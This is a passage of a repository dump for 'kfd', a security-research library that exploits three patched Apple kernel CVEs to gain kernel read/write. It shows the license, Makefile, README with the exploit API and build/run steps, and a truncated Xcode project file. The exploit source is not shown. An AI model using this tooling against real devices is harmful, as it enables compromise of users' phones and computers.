Project Path: arc_felix-pb_kfd_jgs97273

Source Tree:

```txt
arc_felix-pb_kfd_jgs97273
â”œâ”€â”€ LICENSE
â”œâ”€â”€ Makefile
â”œâ”€â”€ README.md
â”œâ”€â”€ kfd
â”‚   â”œâ”€â”€ Assets.xcassets
â”‚   â”‚   â”œâ”€â”€ AccentColor.colorset
â”‚   â”‚   â”‚   â””â”€â”€ Contents.json
â”‚   â”‚   â”œâ”€â”€ AppIcon.appiconset
â”‚   â”‚   â”‚   â””â”€â”€ Contents.json
â”‚   â”‚   â””â”€â”€ Contents.json
â”‚   â”œâ”€â”€ ContentView.swift
â”‚   â”œâ”€â”€ Preview Content
â”‚   â”‚   â””â”€â”€ Preview Assets.xcassets
â”‚   â”‚       â””â”€â”€ Contents.json
â”‚   â”œâ”€â”€ kfd-Bridging-Header.h
â”‚   â”œâ”€â”€ kfd.entitlements
â”‚   â”œâ”€â”€ kfdApp.swift
â”‚   â”œâ”€â”€ libkfd
â”‚   â”‚   â”œâ”€â”€ common.h
â”‚   â”‚   â”œâ”€â”€ info
â”‚   â”‚   â”‚   â”œâ”€â”€ dynamic_info.h
â”‚   â”‚   â”‚   â””â”€â”€ static_info.h
â”‚   â”‚   â”œâ”€â”€ info.h
â”‚   â”‚   â”œâ”€â”€ krkw
â”‚   â”‚   â”‚   â”œâ”€â”€ kread
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ kread_kqueue_workloop_ctl.h
â”‚   â”‚   â”‚   â”‚   â””â”€â”€ kread_sem_open.h
â”‚   â”‚   â”‚   â””â”€â”€ kwrite
â”‚   â”‚   â”‚       â”œâ”€â”€ kwrite_dup.h
â”‚   â”‚   â”‚       â””â”€â”€ kwrite_sem_open.h
â”‚   â”‚   â”œâ”€â”€ krkw.h
â”‚   â”‚   â”œâ”€â”€ perf.h
â”‚   â”‚   â”œâ”€â”€ puaf
â”‚   â”‚   â”‚   â”œâ”€â”€ landa.h
â”‚   â”‚   â”‚   â”œâ”€â”€ physpuppet.h
â”‚   â”‚   â”‚   â””â”€â”€ smith.h
â”‚   â”‚   â””â”€â”€ puaf.h
â”‚   â””â”€â”€ libkfd.h
â”œâ”€â”€ kfd.xcodeproj
â”‚   â”œâ”€â”€ project.pbxproj
â”‚   â””â”€â”€ project.xcworkspace
â”‚       â”œâ”€â”€ contents.xcworkspacedata
â”‚       â””â”€â”€ xcshareddata
â”‚           â””â”€â”€ IDEWorkspaceChecks.plist
â”œâ”€â”€ macos_kfd.c
â””â”€â”€ writeups
    â”œâ”€â”€ exploiting-puafs.md
    â”œâ”€â”€ figures
    â”‚   â”œâ”€â”€ exploiting-puafs-figure1.png
    â”‚   â”œâ”€â”€ exploiting-puafs-figure2.png
    â”‚   â”œâ”€â”€ landa-figure1.png
    â”‚   â”œâ”€â”€ landa-figure2.png
    â”‚   â”œâ”€â”€ landa-figure3.png
    â”‚   â”œâ”€â”€ landa-figure4.png
    â”‚   â”œâ”€â”€ landa-figure5.png
    â”‚   â”œâ”€â”€ landa-figure6.png
    â”‚   â”œâ”€â”€ landa-figure7.png
    â”‚   â”œâ”€â”€ physpuppet-figure1.png
    â”‚   â”œâ”€â”€ physpuppet-figure2.png
    â”‚   â”œâ”€â”€ physpuppet-figure3.png
    â”‚   â”œâ”€â”€ physpuppet-figure4.png
    â”‚   â”œâ”€â”€ physpuppet-figure5.png
    â”‚   â”œâ”€â”€ physpuppet-figure6.png
    â”‚   â”œâ”€â”€ smith-figure1.png
    â”‚   â”œâ”€â”€ smith-figure2.png
    â”‚   â”œâ”€â”€ smith-figure3.png
    â”‚   â””â”€â”€ smith-figure4.png
    â”œâ”€â”€ landa.md
    â”œâ”€â”€ physpuppet.md
    â””â”€â”€ smith.md

```

`LICENSE`:

```
MIT License

Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Makefile`:

```
b:
	clang -O3 -Wno-deprecated-declarations -o macos_kfd macos_kfd.c

r:
	sync
	./macos_kfd

br:
	make b
	make r

s:
	sudo sysctl kern.maxfiles=262144
	sudo sysctl kern.maxfilesperproc=262144

```

`README.md`:

```md
> Quick disclaimer: I have no intention of adding offsets for other devices and iOS versions.

# kfd

kfd, short for kernel file descriptor, is a project to read and write kernel memory on Apple
devices. It leverages various vulnerabilities that can be exploited to obtain dangling PTEs, which
will be referred to as a PUAF primitive, short for "physical use-after-free". Then, it reallocates
certain kernel objects inside those physical pages and manipulates them directly from user space
through the dangling PTEs in order to achieve a KRKW primitive, short for "kernel read/write". The
exploit code is fully contained in a library, [libkfd](kfd/libkfd.h), but the project also contains
simple executable wrappers for [iOS](kfd/ContentView.swift) and [macOS](macos_kfd.c). The public API
of libkfd is quite small and intuitive:

```c
enum puaf_method {
    puaf_physpuppet,
    puaf_smith,
    puaf_landa,
};

enum kread_method {
    kread_kqueue_workloop_ctl,
    kread_sem_open,
};

enum kwrite_method {
    kwrite_dup,
    kwrite_sem_open,
};

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);
void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size);
void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size);
void kclose(u64 kfd);
```

`kopen()` conceptually opens a "kernel file descriptor". It takes the following 4 arguments:

- `puaf_pages`: The target number of physical pages with dangling PTEs.
- `puaf_method`: The method used to obtain the PUAF primitive, with the following options:
    - `puaf_physpuppet`:
        - This method exploits [CVE-2023-23536][1].
        - Fixed in iOS 16.4 and macOS 13.3.
        - Reachable from the App Sandbox but not the WebContent sandbox.
        - $52,500 Apple Security Bounty reward.
    - `puaf_smith`:
        - This method exploits [CVE-2023-32434][2].
        - Fixed in iOS 16.5.1 and macOS 13.4.1.
        - Reachable from the WebContent sandbox and might have been actively exploited.
    - `puaf_landa`:
        - This method exploits [CVE-2023-41974][3].
        - Fixed in iOS 17.0 and macOS 14.0.
        - Reachable from the App Sandbox but not the WebContent sandbox.
        - $70,000 Apple Security Bounty reward.
- `kread_method`: The method used to obtain the initial `kread()` primitive.
- `kwrite_method`: The method used to obtain the initial `kwrite()` primitive.

If the exploit is successful, `kopen()` returns a 64-bit opaque file descriptor. In practice, this
is just a user space pointer to a structure needed by libkfd. However, since that structure should
not be accessed outside of the library, it is returned as an opaque integer. If the exploit is
unsuccessful, the library will print an error message, sleep for 30 seconds, then exit with a status
code of 1. It sleeps for 30 seconds because the kernel might panic on exit for certain PUAF methods
that require some cleanup post-KRKW (e.g. `puaf_smith`).

`kread()` and `kwrite()` are the user space equivalent of `copyout()` and `copyin()`, respectively.
Please note that the options for `kread_method` and `kwrite_method` are described in a separate
[write-up](writeups/exploiting-puafs.md). In addition, the initial primitives granted by those
methods can be used to bootstrap a better KRKW primitive. Finally, `kclose()` simply closes the
kernel file descriptor. They all take the opaque integer returned by `kopen()` as their first
argument.

[1]: https://support.apple.com/en-us/HT213676
[2]: https://support.apple.com/en-us/HT213814
[3]: https://support.apple.com/en-us/HT213938

---

##  How to build and run kfd on an iPhone?

In Xcode, open the root folder of the project and connect your iOS device.

- To build the project, select Product > Build (âŒ˜B).
- To run the project, select Product > Run (âŒ˜R), then click on the "kopen" button in the app.

---

## How to build and run kfd on a Mac?

In a terminal, navigate to the root folder of the project.

Optionally, to increase the global and per-process file descriptor limits, which will improve the
success rate especially on multiple consecutive runs, enter the command `make s` and type in the
sudo password.

- To build the project, enter the command `make b`.
- To run the project, enter the command `make r`.
- To build and run the project at once, enter the command `make br`.

---

## Where to find detailed write-ups for the exploits?

This README presented a high-level overview of the kfd project. Once a PUAF primitive has been
achieved, the rest of the exploit is generic. Therefore, I have hoisted the common part of the
exploits in a dedicated write-up:

- [Exploiting PUAFs](writeups/exploiting-puafs.md)

In addition, I have split the vulnerability-specific part of the exploits used to achieve the PUAF
primitive into distinct write-ups, listed below in chronological order of discovery:

- [PhysPuppet](writeups/physpuppet.md)
- [Smith](writeups/smith.md)
- [Landa](writeups/landa.md)

However, please note that these write-ups have been written for an audience that is already familiar
with the XNU virtual memory system.

```

`kfd.xcodeproj/project.pbxproj`:

```pbxproj
// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 56;
	objects = {

/* Begin PBXBuildFile section */
		297BA1092A310AE100D1E51A /* kfdApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 297BA1082A310AE100D1E51A /* kfdApp.swift */; };
		297BA10B2A310AE100D1E51A /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 297BA10A2A310AE100D1E51A /* ContentView.swift */; };
		297BA10D2A310AE200D1E51A /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 297BA10C2A310AE200D1E51A /* Assets.xcassets */; };
		297BA1112A310AE200D1E51A /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 297BA1102A310AE200D1E51A /* Preview Assets.xcassets */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		290FDCD52A719E4F00A8BCAE /* dynamic_info.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = dynamic_info.h; sourceTree = "<group>"; };
		290FDCD62A719E5700A8BCAE /* static_info.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = static_info.h; sourceTree = "<group>"; };
		2948BA6E2A3162FD00B2ED3C /* common.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = common.h; sourceTree = "<group>"; };
		2948BA6F2A31630800B2ED3C /* info.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = info.h; sourceTree = "<group>"; };
		2948BA702A31631000B2ED3C /* krkw.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = krkw.h; sourceTree = "<group>"; };
		2948BA712A31631C00B2ED3C /* puaf.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = puaf.h; sourceTree = "<group>"; };
		2948BA722A31636600B2ED3C /* physpuppet.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = physpuppet.h; sourceTree = "<group>"; };
		2948BA762A3163AB00B2ED3C /* kread_kqueue_workloop_ctl.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = kread_kqueue_workloop_ctl.h; sourceTree = "<group>"; };
		2948BA772A3163B900B2ED3C /* kread_sem_open.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = kread_sem_open.h; sourceTree = "<group>"; };
		2948BA782A3163C500B2ED3C /* kwrite_dup.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = kwrite_dup.h; sourceTree = "<group>"; };
		2948BA792A3163D200B2ED3C /* kwrite_sem_open.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = kwrite_sem_open.h; sourceTree = "<group>"; };
		2965065D2A31565B0025D1A7 /* kfd-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "kfd-Bridging-Header.h"; sourceTree = "<group>"; };
		2965065E2A31565B0025D1A7 /* libkfd.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = libkfd.h; sourceTree = "<group>"; };
		297BA1052A310AE100D1E51A /* kfd.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = kfd.app; sourceTree = BUILT_PRODUCTS_DIR; };
		297BA1082A310AE100D1E51A /* kfdApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = kfdApp.swift; sourceTree = "<group>"; };
		297BA10A2A310AE100D1E51A /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
		297BA10C2A310AE200D1E51A /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		297BA10E2A310AE200D1E51A /* kfd.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = kfd.entitlements; sourceTree = "<group>"; };
		297BA1102A310AE200D1E51A /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
		29A358F32A43B53300C297A1 /* smith.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = smith.h; sourceTree = "<group>"; };
		29A765292A393FCB006617E8 /* perf.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = perf.h; sourceTree = "<group>"; };
		29A7652A2A394110006617E8 /* landa.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = landa.h; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		297BA1022A310AE100D1E51A /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		2948BA6A2A3162C600B2ED3C /* libkfd */ = {
			isa = PBXGroup;
			children = (
				2948BA6E2A3162FD00B2ED3C /* common.h */,
				2948BA6B2A3162DE00B2ED3C /* info */,
				2948BA6F2A31630800B2ED3C /* info.h */,
				2948BA6C2A3162E400B2ED3C /* krkw */,
				2948BA702A31631000B2ED3C /* krkw.h */,
				29A765292A393FCB006617E8 /* perf.h */,
				2948BA6D2A3162E900B2ED3C /* puaf */,
				2948BA712A31631C00B2ED3C /* puaf.h */,
			);
			path = libkfd;
			sourceTree = "<group>";
		};
		2948BA6B2A3162DE00B2ED3C /* info */ = {
			isa = PBXGroup;
			children = (
				290FDCD52A719E4F00A8BCAE /* dynamic_info.h */,
				290FDCD62A719E5700A8BCAE /* static_info.h */,
			);
			path = info;
			sourceTree = "<group>";
		};
		2948BA6C2A3162E400B2ED3C /* krkw */ = {
			isa = PBXGroup;
			children = (
				2948BA742A31639800B2ED3C /* kread */,
				2948BA752A31639D00B2ED3C /* kwrite */,
			);
			path = krkw;
			sourceTree = "<group>";
		};
		2948BA6D2A3162E900B2ED3C /* puaf */ = {
			isa = PBXGroup;
			children = (
				29A7652A2A394110006617E8 /* landa.h */,
				2948BA722A31636600B2ED3C /* physpuppet.h */,
				29A358F32A43B53300C297A1 /* smith.h */,
			);
			path = puaf;
			sourceTree = "<group>";
		};
		2948BA742A31639800B2ED3C /* kread */ = {
			isa = PBXGroup;
			children = (
				2948BA762A3163AB00B2ED3C /* kread_kqueue_workloop_ctl.h */,
				2948BA772A3163B900B2ED3C /* kread_sem_open.h */,
			);
			path = kread;
			sourceTree = "<group>";
		};
		2948BA752A31639D00B2ED3C /* kwrite */ = {
			isa = PBXGroup;
			children = (
				2948BA782A3163C500B2ED3C /* kwrite_dup.h */,
				2948BA792A3163D200B2ED3C /* kwrite_sem_open.h */,
			);
			path = kwrite;
			sourceTree = "<group>";
		};
		297BA0FC2A310AE100D1E51A = {
			isa = PBXGroup;
			children = (
				297BA1072A310AE100D1E51A /* kfd */,
				297BA1062A310AE100D1E51A /* Products */,
			);
			sourceTree = "<group>";
		};
		297BA1062A310AE100D1E51A /* Products */ = {
			isa = PBXGroup;
			children = (
				297BA1052A310AE100D1E51A /* kfd.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		297BA1072A310AE100D1E51A /* kfd */ = {
			isa = PBXGroup;
			children = (
				297BA10C2A310AE200D1E51A /* Assets.xcassets */,
				297BA10A2A310AE100D1E51A /* ContentView.swift */,
				2965065D2A31565B0025D1A7 /* kfd-Bridging-Header.h */,
				297BA10E2A310AE200D1E51A /* kfd.entitlements */,
				297BA1082A310AE100D1E51A /* kfdApp.swift */,
				2948BA6A2A3162C600B2ED3C /* libkfd */,
				2965065E2A31565B0025D1A7 /* libkfd.h */,
				297BA10F2A310AE200D1E51A /* Preview Content */,
			);
			path = kfd;
			sourceTree = "<group>";
		};
		297BA10F2A310AE200D1E51A /* Preview Content */ = {
			isa = PBXGroup;
			children = (
				297BA1102A310AE200D1E51A /* Preview Assets.xcassets */,
			);
			path = "Preview Content";
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		297BA1042A310AE100D1E51A /* kfd */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 297BA1142A310AE200D1E51A /* Build configuration list for PBXNativeTarget "kfd" */;
			buildPhases = (
				297BA1012A310AE100D1E51A /* Sources */,
				297BA1022A310AE100D1E51A /* Frameworks */,
				297BA1032A310AE100D1E51A /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = kfd;
			productName = kfd;
			productReference = 297BA1052A310AE100D1E51A /* kfd.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		297BA0FD2A310AE100D1E51A /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1430;
				LastUpgradeCheck = 1430;
				TargetAttributes = {
					297BA1042A310AE100D1E51A = {
						CreatedOnToolsVersion = 14.3.1;
						LastSwiftMigration = 1430;
					};
				};
			};
			buildConfigurationList = 297BA1002A310AE100D1E51A /* Build configuration list for PBXProject "kfd" */;
			compatibilityVersion = "Xcode 14.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 297BA0FC2A310AE100D1E51A;
			productRefGroup = 297BA1062A310AE100D1E51A /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				297BA1042A310AE100D1E51A /* kfd */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		297BA1032A310AE100D1E51A /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				297BA1112A310AE200D1E51A /* Preview Assets.xcassets in Resources */,
				297BA10D2A310AE200D1E51A /* Assets.xcassets in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		297BA1012A310AE100D1E51A /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				297BA10B2A310AE100D1E51A /* ContentView.swift in Sources */,
				297BA1092A310AE100D1E51A /* kfdApp.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		297BA1122A310AE200D1E51A /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		297BA1132A310AE200D1E51A /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
			};
			name = Release;
		};
		297BA1152A310AE200D1E51A /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_ENTITLEMENTS = kfd/kfd.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"kfd/Preview Content\"";
				DEVELOPMENT_TEAM = 4YW3B9LRX5;
				ENABLE_HARDENED_RUNTIME = YES;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UILaunchScreen_Generation[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UILaunchScreen_Generation[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphoneos*]" = UIStatusBarStyleDefault;
				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphonesimulator*]" = UIStatusBarStyleDefault;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 16.4;
				LD_RUNPATH_SEARCH_PATHS = "@executable_path/Frameworks";
				"LD_RUNPATH_SEARCH_PATHS[sdk=macosx*]" = "@executable_path/../Frameworks";
				MACOSX_DEPLOYMENT_TARGET = 13.3;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.p0up0u.kfd;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SDKROOT = auto;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator macosx";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OBJC_BRIDGING_HEADER = "kfd/kfd-Bridging-Header.h";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		297BA1162A310AE200D1E51A /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_ENTITLEMENTS = kfd/kfd.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"kfd/Preview Content\"";
				DEVELOPMENT_TEAM = 4YW3B9LRX5;
				ENABLE_HARDENED_RUNTIME = YES;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UILaunchScreen_Generation[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UILaunchScreen_Generation[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphoneos*]" = UIStatusBarStyleDefault;
				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphonesimulator*]" = UIStatusBarStyleDefault;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
